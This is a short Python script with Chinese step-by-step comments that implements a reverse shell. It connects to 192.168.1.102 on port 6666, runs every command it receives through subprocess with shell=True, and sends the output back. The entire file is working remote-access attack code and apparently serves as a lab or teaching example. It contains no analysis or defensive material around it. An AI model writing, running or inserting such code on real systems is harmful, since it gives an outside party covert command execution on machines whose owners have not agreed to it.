import subprocess,socket

def main():
    ip = "192.168.1.102"
    port = 6666
    # 建立socket
    shell_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    # connect连接
    shell_socket.connect((ip,port))
    # 接收数据
    while True:
        data = shell_socket.recv(1024).decode("gbk")
        # subprocess执行shell命令

        command = subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        STDOUT,STDERR = command.communicate()
        # byte 类型区别于 python2.X
        # 发送输出命令

        shell_socket.send(STDOUT) # 直接发送bytes
    # 关闭socket
    shell_socket.close()

if __name__ == '__main__':
    main()